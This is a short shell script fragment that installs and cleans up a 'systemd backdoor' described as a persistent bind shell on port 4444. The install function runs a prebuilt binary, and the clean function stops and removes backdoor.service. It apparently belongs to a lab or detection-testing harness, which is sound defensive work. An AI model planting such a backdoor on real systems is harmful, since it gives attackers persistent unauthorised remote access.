# Systemd backdoor (persistent bind shell on 4444)
install_backdoor() {
    echo "[*] Installing systemd backdoor..."
    "$ASSETS_DIR/build/systemd_backdoor" && set_flag "backdoor"
}

clean_backdoor() {
    echo "[*] Cleaning systemd backdoor..."
    systemctl stop backdoor.service 2>/dev/null || true
    systemctl disable backdoor.service 2>/dev/null || true
    rm -f /etc/systemd/system/backdoor.service
    systemctl daemon-reload
    clear_flag "backdoor"
}
